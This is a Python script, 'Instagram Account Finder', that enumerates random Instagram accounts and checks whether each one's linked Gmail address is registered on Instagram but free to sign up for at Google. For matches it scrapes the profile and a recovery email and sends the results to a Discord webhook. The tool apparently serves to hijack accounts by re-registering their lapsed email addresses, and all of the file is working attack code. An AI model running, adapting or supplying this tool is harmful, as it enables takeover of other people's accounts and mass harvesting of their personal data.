import os
import re
import json
from time import time
from hashlib import md5
from threading import Thread
from random import randrange, choice

try:
    import requests
    from user_agent import generate_user_agent
except ImportError:
    os.system("pip install requests")
    os.system("pip install user_agent")

    import requests
    from user_agent import generate_user_agent


MIN_FOLLOWERS = 30
THREAD_COUNT = 10

OUTPUT_FILE = "FinderResults.txt"


bad_instas = 0
total_checks = 0
matches_found = 0
no_gmail_match = 0
last_notification_time = 0
notification_frequency = 100


class Colors:
    RED = "\033[1;91m"
    GREEN = "\033[1;92m"
    YELLOW = "\033[1;93m"
    BLUE = "\033[1;94m"
    MAGENTA = "\033[1;95m"
    CYAN = "\033[1;96m"
    WHITE = "\033[1;97m"
    GRAY = "\033[1;90m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"
    RESET = "\033[0m"

    @staticmethod
    def success(text):
        return f"{Colors.GREEN}{text}{Colors.RESET}"

    @staticmethod
    def error(text):
        return f"{Colors.RED}{text}{Colors.RESET}"

    @staticmethod
    def warning(text):
        return f"{Colors.YELLOW}{text}{Colors.RESET}"

    @staticmethod
    def info(text):
        return f"{Colors.BLUE}{text}{Colors.RESET}"

    @staticmethod
    def highlight(text):
        return f"{Colors.BOLD}{Colors.CYAN}{text}{Colors.RESET}"


def clear_screen():
    os.system("clear" if os.name == "posix" else "cls")


def print_stats(last_checked_email=""):
    clear_screen()

    success_rate = (matches_found / total_checks * 100) if total_checks > 0 else 0

    from datetime import datetime

    current_time = datetime.now().strftime("%H:%M:%S")

    from itertools import cycle

    spinner = cycle(["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"])
    spin_char = next(spinner)

    header = f"{Colors.BOLD}{Colors.CYAN}Instagram Account Finder{Colors.RESET}"

    print(
        f"""
    ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
    ┃  {header}                             
    ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
    ┃  {Colors.GREEN}● Matches Found    : {matches_found:>5}{Colors.RESET}                      
    ┃  {Colors.RED}● Invalid Accounts  : {bad_instas:>5}{Colors.RESET}                      
    ┃  {Colors.YELLOW}● Gmail Mismatches  : {no_gmail_match:>5}{Colors.RESET}                      
    ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
    ┃  {Colors.BLUE}● Total Processed   : {total_checks:>5}{Colors.RESET}                      
    ┃  {Colors.MAGENTA}● Success Rate      : {success_rate:.2f}%{Colors.RESET}                    
    ┃  {Colors.CYAN}● Current Time      : {current_time}{Colors.RESET}                 
    ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
    ┃  {Colors.WHITE}Last Checked: {Colors.YELLOW}{last_checked_email[:30]}{Colors.RESET}{"..." if len(last_checked_email) > 30 else ""}  
    ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
    
    {spin_char} {Colors.GRAY}Running with {THREAD_COUNT} threads... Press Ctrl+C to stop{Colors.RESET}
    """
    )


def send_discord_notification(data, webhook_url, profile_info=None):
    if not webhook_url:
        return False

    try:

        if profile_info:

            profile_url = f"https://instagram.com/{profile_info['username']}"

            fields = [
                {
                    "name": "👤 Username",
                    "value": f"[@{profile_info['username']}]({profile_url})",
                    "inline": True,
                },
                {
                    "name": "📧 Email",
                    "value": f"{profile_info['email']}",
                    "inline": True,
                },
            ]

            if profile_info["recovery_email"] != "Not Available":
                fields.append(
                    {
                        "name": "🔄 Recovery Email",
                        "value": f"{profile_info['recovery_email']}",
                        "inline": False,
                    }
                )

            fields.extend(
                [
                    {
                        "name": "👥 Followers",
                        "value": f"{profile_info['followers']}",
                        "inline": True,
                    },
                    {
                        "name": "👣 Following",
                        "value": f"{profile_info['following']}",
                        "inline": True,
                    },
                    {
                        "name": "📊 Posts",
                        "value": f"{profile_info['posts']}",
                        "inline": True,
                    },
                ]
            )

            if profile_info["biography"] and profile_info["biography"] != "N/A":
                fields.append(
                    {
                        "name": "📝 Biography",
                        "value": f"{profile_info['biography'][:1000]}",
                        "inline": False,
                    }
                )

            message = {
                "embeds": [
                    {
                        "title": f"✅ Instagram Account Found: {profile_info['full_name']}",
                        "url": profile_url,
                        "description": f"**Account ID**: `{profile_info['user_id']}`",
                        "color": 3066993,
                        "fields": fields,
                        "thumbnail": {
                            "url": f"https://ui-avatars.com/api/?name={profile_info['username']}&background=random"
                        },
                        "footer": {
                            "text": "Instagram Username Finder • Account Details"
                        },
                        "timestamp": datetime.datetime.utcnow().isoformat(),
                    }
                ]
            }
        else:

            message = {
                "embeds": [
                    {
                        "title": "✅ Instagram Account Found",
                        "description": f"{data}",
                        "color": 5763719,
                        "footer": {"text": "Instagram Username Finder"},
                    }
                ]
            }

        response = requests.post(webhook_url, json=message)

        if response.status_code == 204:
            print(f"{Colors.success('Discord Notification Sent!')}")
            return True
        else:
            print(
                f"{Colors.error(f'Failed To Send Discord Notification! Status: {response.status_code}')}"
            )
            return False
    except Exception as e:
        print(f"{Colors.error(f'Error Sending Discord Notification: {e}')}")
        return False


def send_stats_notification(webhook_url):
    if not webhook_url:
        return False

    try:
        import datetime

        total_processed = total_checks if total_checks > 0 else 1
        success_rate = (matches_found / total_processed) * 100

        success_bar = create_progress_bar(success_rate, 20)

        uptime_seconds = (
            time() - last_notification_time if last_notification_time > 0 else 60
        )
        uptime_hours = max(uptime_seconds / 3600, 0.01)
        checks_per_hour = round(total_checks / uptime_hours)

        message = {
            "embeds": [
                {
                    "title": "📊 Instagram Username Finder - Status Report",
                    "description": f"**Current Session Status**\n{success_bar} `{success_rate:.2f}%`",
                    "color": 3447003,
                    "fields": [
                        {
                            "name": "✅ Accounts Found",
                            "value": f"`{matches_found}` accounts",
                            "inline": True,
                        },
                        {
                            "name": "❌ Bad Accounts",
                            "value": f"`{bad_instas}` accounts",
                            "inline": True,
                        },
                        {
                            "name": "⚠️ Gmail Mismatches",
                            "value": f"`{no_gmail_match}` accounts",
                            "inline": True,
                        },
                        {
                            "name": "🔍 Total Checks",
                            "value": f"`{total_checks}` checks",
                            "inline": True,
                        },
                        {
                            "name": "⚡ Processing Rate",
                            "value": f"`{checks_per_hour}` checks/hour",
                            "inline": True,
                        },
                        {
                            "name": "🧵 Active Threads",
                            "value": f"`{THREAD_COUNT}` threads",
                            "inline": True,
                        },
                    ],
                    "footer": {
                        "text": "Instagram Username Finder • Auto-generated Status Report"
                    },
                    "timestamp": datetime.datetime.utcnow().isoformat(),
                }
            ]
        }

        response = requests.post(webhook_url, json=message)

        if response.status_code == 204:
            print(f"{Colors.success('Stats Notification Sent!')}")
            return True
        else:
            print(
                f"{Colors.error(f'Failed To Send Stats Notification! Status: {response.status_code}')}"
            )
            return False
    except Exception as e:
        print(f"{Colors.error(f'Error Sending Stats Notification: {e}')}")
        return False


def create_progress_bar(percent, length=10):
    """Create a visual progress bar for Discord embeds"""
    filled = int(percent * length / 100)
    empty = length - filled

    return f"{'█' * filled}{'░' * empty}"


def get_google_token():
    try:
        letters = "abcdefghijklmnopqrstuvwxyz"
        n1 = "".join(choice(letters) for _ in range(randrange(6, 9)))
        n2 = "".join(choice(letters) for _ in range(randrange(3, 9)))
        host = "".join(choice(letters) for _ in range(randrange(15, 30)))

        headers = {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "google-accounts-xsrf": "1",
            "user-agent": generate_user_agent(),
        }

        recovery_page = requests.get(
            "https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin",
            headers=headers,
        )

        token_match = re.search(
            r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
            recovery_page.text,
        )

        if not token_match:
            raise Exception("Failed To Extract Token")

        tok = token_match.group(2)

        cookies = {"__Host-GAPS": host}
        headers = {
            "authority": "accounts.google.com",
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "google-accounts-xsrf": "1",
            "origin": "https://accounts.google.com",
            "referer": "https://accounts.google.com/signup/v2/createaccount",
            "user-agent": generate_user_agent(),
        }

        data = {
            "f.req": f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            "deviceinfo": '[null,null,null,null,null,"US",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
        }

        response = requests.post(
            "https://accounts.google.com/_/signup/validatepersonaldetails",
            cookies=cookies,
            headers=headers,
            data=data,
        )

        tl = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict().get("__Host-GAPS", "")

        with open("GoogleToken.txt", "w") as f:
            f.write(f"{tl}//{host}\n")

        return tl, host

    except Exception as e:
        print(f"Error Getting Google Token : {e}")
        return get_google_token()


def check_gmail_exists(username):
    if "@" in username:
        username = str(username).split("@")[0]

    try:
        try:
            with open("GoogleToken.txt", "r") as f:
                token_data = f.read().strip().split("//")
                if len(token_data) != 2:
                    raise Exception("Invalid Token Format")
                tl, host = token_data
        except:
            tl, host = get_google_token()

        cookies = {"__Host-GAPS": host}
        headers = {
            "authority": "accounts.google.com",
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "google-accounts-xsrf": "1",
            "origin": "https://accounts.google.com",
            "referer": f"https://accounts.google.com/signup/v2/createusername?TL={tl}",
            "user-agent": generate_user_agent(),
        }

        params = {"TL": tl}

        data = f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&flowEntry=SignUp&service=mail&f.req=%5B%22TL%3A{tl}%22%2C%22{username}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22US%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn"

        response = requests.post(
            "https://accounts.google.com/_/signup/usernameavailability",
            params=params,
            cookies=cookies,
            headers=headers,
            data=data,
        )

        if '"gf.uar",1' in str(response.text):
            return True
        elif '"er",null,null,null,null,400' in str(response.text):
            get_google_token()
            return check_gmail_exists(username)
        else:
            return False
    except Exception:
        return check_gmail_exists(username)


def get_recovery_email(username):
    try:
        headers = {
            "X-IG-App-ID": "567067343352427",
            "User-Agent": "Instagram 100.0.0.17.129 Android",
            "Accept-Language": "en-US",
            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        }

        data = {
            "signed_body": f'SIGNATURE.{{"query":"{username}"}}',
            "ig_sig_key_version": "4",
        }

        response = requests.post(
            "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/",
            headers=headers,
            data=data,
        ).json()

        return response.get("email", "Not Available")
    except:
        return "Not Available"


def get_instagram_profile(username):
    """Get Details Of An Instagram Profile"""
    global matches_found
    matches_found += 1

    try:
        url = f"https://i.instagram.com/api/v1/users/web_profile_info/?username={username}"

        headers = {
            "accept": "*/*",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "x-ig-app-id": "936619743392459",
        }

        response = requests.get(url, headers=headers).json()
        user_data = response.get("data", {}).get("user", {})

        profile_info = {
            "full_name": user_data.get("full_name", "N/A"),
            "username": username,
            "email": f"{username}@gmail.com",
            "followers": user_data.get("edge_followed_by", {}).get("count", "N/A"),
            "following": user_data.get("edge_follow", {}).get("count", "N/A"),
            "user_id": user_data.get("id", "N/A"),
            "posts": user_data.get("edge_owner_to_timeline_media", {}).get(
                "count", "N/A"
            ),
            "biography": user_data.get("biography", "N/A"),
            "recovery_email": get_recovery_email(username),
        }

        output = f"""
        {Colors.BOLD}{Colors.CYAN}INSTAGRAM ACCOUNT INFO{Colors.RESET}
        {Colors.GRAY}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.RESET}
        {Colors.BOLD}NAME:{Colors.RESET} {Colors.WHITE}{profile_info['full_name']}{Colors.RESET}
        
        {Colors.BOLD}EMAIL:{Colors.RESET} {Colors.WHITE}{username}@gmail.com{Colors.RESET}
        {Colors.BOLD}RECOVERY EMAIL:{Colors.RESET} {Colors.WHITE}{profile_info['recovery_email']}{Colors.RESET}

        {Colors.BOLD}USERNAME:{Colors.RESET} {Colors.GREEN}@{username}{Colors.RESET}
        
        {Colors.BOLD}FOLLOWERS:{Colors.RESET} {Colors.YELLOW}{profile_info['followers']}{Colors.RESET}
        {Colors.BOLD}FOLLOWING:{Colors.RESET} {Colors.YELLOW}{profile_info['following']}{Colors.RESET}
        
        {Colors.BOLD}ID:{Colors.RESET} {Colors.WHITE}{profile_info['user_id']}{Colors.RESET}
        {Colors.BOLD}BIO:{Colors.RESET} {Colors.GRAY}{profile_info['biography']}{Colors.RESET}
        
        {Colors.BOLD}POSTS:{Colors.RESET} {Colors.MAGENTA}{profile_info['posts']}{Colors.RESET}
        {Colors.GRAY}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.RESET}
        """
        print(output)

        from datetime import datetime

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        with open(OUTPUT_FILE, "a") as f:
            f.write(f"[{timestamp}] {output}\n")

        if config["discord"]["enabled"]:
            webhook_url = config["discord"]["webhook_url"]
            if webhook_url:

                send_discord_notification(output, webhook_url, profile_info)

    except Exception as e:
        print(f"{Colors.error(f'Error Retrieving Profile: {e}')}")


def check_instagram_account(email):
    global bad_instas, no_gmail_match, total_checks, last_notification_time

    try:
        csrftoken = md5(str(time()).encode()).hexdigest()
        user_agent = generate_user_agent()

        headers = {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://www.instagram.com",
            "referer": "https://www.instagram.com/accounts/signup/email/",
            "user-agent": user_agent,
            "x-csrftoken": csrftoken,
        }

        data = {"email": email}

        response = requests.post(
            "https://www.instagram.com/api/v1/web/accounts/check_email/",
            headers=headers,
            data=data,
        )

        if "email_is_taken" in response.text:
            username = email.split("@")[0]

            if check_gmail_exists(username):
                get_instagram_profile(username)
            else:
                no_gmail_match += 1
        else:
            bad_instas += 1
    except:
        pass

    total_checks += 1

    if config["discord"]["enabled"]:
        current_time = time()
        if config["notification_settings"]["time_based"]:
            interval_seconds = config["notification_settings"]["interval_minutes"] * 60
            if current_time - last_notification_time > interval_seconds:
                send_stats_notification(config["discord"]["webhook_url"])
                last_notification_time = current_time

        else:
            stats_frequency = config["notification_settings"]["stats_frequency"]
            if total_checks % stats_frequency == 0:
                send_stats_notification(config["discord"]["webhook_url"])
                last_notification_time = current_time

    print_stats(email)


def find_instagram_accounts():
    while True:
        try:
            id = str(randrange(1900000000, 2100000000))

            lsd = "".join(choice("eQ6xuzk5X8j6_fGvb0gJrc") for _ in range(16))

            headers = {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://www.instagram.com",
                "referer": "https://www.instagram.com/",
                "user-agent": generate_user_agent(),
                "x-fb-lsd": f"token{lsd}",
            }

            data = {
                "lsd": f"token{lsd}",
                "variables": f'{{"id":"{id}","relay_header":false,"render_surface":"PROFILE"}}',
                "doc_id": "7397388303713986",
            }

            response = requests.post(
                "https://www.instagram.com/api/graphql",
                headers=headers,
                data=data,
            )

            response_json = response.json()
            user_data = response_json.get("data", {}).get("user", {})
            username = user_data.get("username")
            follower_count = user_data.get("follower_count", 0)

            if username and follower_count >= MIN_FOLLOWERS:
                email = f"{username}@gmail.com"
                check_instagram_account(email)
        except:
            continue


def save_config(config):
    with open("AccountFinderConfig.json", "w") as f:
        json.dump(config, f, indent=4)


def load_config():
    try:
        with open("AccountFinderConfig.json", "r") as f:
            config = json.load(f)
            if "discord" not in config:
                config["discord"] = {"enabled": False, "webhook_url": ""}
            if "notification_settings" not in config:
                config["notification_settings"] = {
                    "stats_frequency": 100,
                    "interval_minutes": 15,
                    "time_based": True,
                }
            return config
    except (FileNotFoundError, json.JSONDecodeError):
        return {
            "discord": {"enabled": False, "webhook_url": ""},
            "notification_settings": {
                "stats_frequency": 100,
                "time_based": True,
                "interval_minutes": 15,
            },
        }


if __name__ == "__main__":
    import datetime

    try:
        from colorama import init

        init()
    except ImportError:
        os.system("pip install colorama")
        from colorama import init

        init()

    clear_screen()

    banner = f"""
    {Colors.CYAN}╔══════════════════════════════════════════════╗
    ║ {Colors.WHITE}Instagram Account Finder {Colors.YELLOW}v1.1{Colors.CYAN}                ║
    ║ {Colors.GRAY}Developed by SurgePrivate{Colors.CYAN}                    ║
    ╚══════════════════════════════════════════════╝{Colors.RESET}
    """
    print(banner)

    config = load_config()

    print(
        f"{Colors.YELLOW}[1/3] {Colors.WHITE}Discord Notification Setup:{Colors.RESET}"
    )
    use_discord = (
        input(
            f"  {Colors.GRAY}› {Colors.WHITE}Enable Discord notifications? (Y/N): {Colors.CYAN}"
        ).upper()
        == "Y"
    )

    if use_discord:
        config["discord"]["enabled"] = True

        if config["discord"]["webhook_url"]:
            webhook_prompt = f"  {Colors.GRAY}› {Colors.WHITE}Webhook URL [{config['discord']['webhook_url'][:20]}...]: {Colors.CYAN}"
        else:
            webhook_prompt = (
                f"  {Colors.GRAY}› {Colors.WHITE}Webhook URL: {Colors.CYAN}"
            )

        webhook_url = input(webhook_prompt)
        config["discord"]["webhook_url"] = (
            webhook_url if webhook_url else config["discord"]["webhook_url"]
        )

        print(
            f"\n{Colors.YELLOW}[2/3] {Colors.WHITE}Notification Settings:{Colors.RESET}"
        )

        print(f"  {Colors.GRAY}› {Colors.WHITE}Notification mode:")
        print(
            f"    {Colors.GRAY}1. {Colors.WHITE}Time-based (Reports After Every X Minutes)"
        )
        print(
            f"    {Colors.GRAY}2. {Colors.WHITE}Count-based (Reports After Every X Checks)"
        )

        notification_type = input(
            f"  {Colors.GRAY}› {Colors.WHITE}Choose Mode [1-2]: {Colors.CYAN}"
        )

        if notification_type == "2":
            config["notification_settings"]["time_based"] = False

            freq_prompt = f"  {Colors.GRAY}› {Colors.WHITE}Send Report Every X Checks [{config['notification_settings']['stats_frequency']}]: {Colors.CYAN}"
            freq = input(freq_prompt)

            if freq and freq.isdigit():
                config["notification_settings"]["stats_frequency"] = int(freq)
        else:
            config["notification_settings"]["time_based"] = True

            minutes_prompt = f"  {Colors.GRAY}› {Colors.WHITE}Send Report Every X Minutes [{config['notification_settings']['interval_minutes']}]: {Colors.CYAN}"
            minutes = input(minutes_prompt)

            if minutes and minutes.isdigit():
                config["notification_settings"]["interval_minutes"] = int(minutes)
    else:
        config["discord"]["enabled"] = False

    print(f"\n{Colors.YELLOW}[3/3] {Colors.WHITE}Performance Settings:{Colors.RESET}")

    threads_prompt = f"  {Colors.GRAY}› {Colors.WHITE}Number Of Threads [{THREAD_COUNT}]: {Colors.CYAN}"
    threads = input(threads_prompt)

    if threads and threads.isdigit() and 1 <= int(threads) <= 100:
        THREAD_COUNT = int(threads)

    followers_prompt = f"  {Colors.GRAY}› {Colors.WHITE}Minimum Followers [{MIN_FOLLOWERS}]: {Colors.CYAN}"
    followers = input(followers_prompt)

    if followers and followers.isdigit():
        MIN_FOLLOWERS = int(followers)

    save_config(config)

    if config["discord"]["enabled"]:
        print(f"\n{Colors.success('✓ Discord notifications enabled')}")

        webhook_url = config["discord"]["webhook_url"]

        startup_message = {
            "embeds": [
                {
                    "title": "🚀 Instagram Account Finder Started",
                    "description": "The Instagram Account Finder has been started and is now searching for accounts.",
                    "color": 5814783,
                    "fields": [
                        {
                            "name": "🧵 Threads",
                            "value": f"`{THREAD_COUNT}` threads",
                            "inline": True,
                        },
                        {
                            "name": "👥 Min. Followers",
                            "value": f"`{MIN_FOLLOWERS}` followers",
                            "inline": True,
                        },
                        {
                            "name": "📊 Notification Mode",
                            "value": f"{'Time-based' if config['notification_settings']['time_based'] else 'Count-based'}",
                            "inline": True,
                        },
                    ],
                    "footer": {"text": "Instagram Username Finder • Session Started"},
                    "timestamp": datetime.datetime.utcnow().isoformat(),
                }
            ]
        }

        requests.post(webhook_url, json=startup_message)

    print(f"\n{Colors.highlight('Starting search...')}")
    print(
        f"{Colors.GRAY}› Running with {Colors.CYAN}{THREAD_COUNT}{Colors.GRAY} threads"
    )
    print(f"{Colors.GRAY}› Minimum followers: {Colors.CYAN}{MIN_FOLLOWERS}")
    print(f"{Colors.GRAY}› Results will be saved to {Colors.CYAN}{OUTPUT_FILE}")
    print(f"{Colors.GRAY}› Press Ctrl+C to stop the process{Colors.RESET}\n")

    last_notification_time = time()

    threads = []
    for _ in range(THREAD_COUNT):
        t = Thread(target=find_instagram_accounts)
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:

        if config["discord"]["enabled"]:
            shutdown_message = {
                "embeds": [
                    {
                        "title": "🛑 Instagram Account Finder Stopped",
                        "description": "The Instagram Account Finder has been stopped by the user.",
                        "color": 15548997,
                        "fields": [
                            {
                                "name": "✅ Accounts Found",
                                "value": f"`{matches_found}` accounts",
                                "inline": True,
                            },
                            {
                                "name": "🔍 Total Checks",
                                "value": f"`{total_checks}` checks",
                                "inline": True,
                            },
                        ],
                        "footer": {"text": "Instagram Username Finder • Session Ended"},
                        "timestamp": datetime.datetime.utcnow().isoformat(),
                    }
                ]
            }

            webhook_url = config["discord"]["webhook_url"]
            requests.post(webhook_url, json=shutdown_message)

        print(f"\n{Colors.warning('Search stopped by user')}")
        print(
            f"{Colors.info(f'Found {matches_found} matches')} • {Colors.GRAY}Results saved to {OUTPUT_FILE}{Colors.RESET}"
        )
